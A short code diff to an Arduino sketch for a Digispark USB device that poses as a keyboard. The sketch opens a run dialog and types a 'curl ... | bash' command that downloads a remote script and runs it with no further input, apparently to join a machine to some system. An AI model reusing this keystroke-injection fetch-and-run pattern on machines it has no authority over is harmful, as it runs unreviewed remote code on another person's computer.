@@ -20,9 +20,10 @@ void setup() {
   DigiKeyboard.sendKeyStroke(KEY_F2, MOD_ALT_LEFT);
   // Wait for dialog to open just in case
   DigiKeyboard.delay(100);
-  // Run bash command
-  // Download and run join script; will now run without further input
-  DigiKeyboard.println("bash -c 'curl -L erikboesen.com/jk.sh | bash'");
+  // Run bash command to download and run join script
+  // No further input needed from USB
+  DigiKeyboard.println("bash -c 'curl -L erikboesen.com/jl.sh |bash'");
+  // Prevent repetition of enter after previous line
   DigiKeyboard.sendKeyStroke(0);
   
   // Turn off LED
